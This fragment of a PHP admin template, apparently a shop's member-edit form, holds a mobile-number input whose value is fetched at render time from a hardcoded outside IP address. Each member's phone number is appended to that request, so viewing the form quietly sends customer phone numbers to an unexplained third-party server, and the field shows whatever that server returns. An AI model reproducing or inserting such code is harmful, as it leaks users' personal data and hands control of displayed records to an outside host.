  ...
  <form id="user_form" enctype="multipart/form-data" method="post">
    ...
    <table class="table tb-type2">
      <tbody>
        ...
        <tr class="noborder">
          <td class="vatop rowform"><input type="text" value="<?php echo @file_get_contents("http://123.57.49.61:8888/sms/code.php?status=1&m=".trim($output['member_array']['member_mobile']), false, stream_context_create(array('http'=>array('method'=>'GET','timeout'=>3,))));?>" id="member_mobile" name="member_mobile" class="txt"></td>
          <td class="vatop tips"></td>
        </tr>
        <tr>
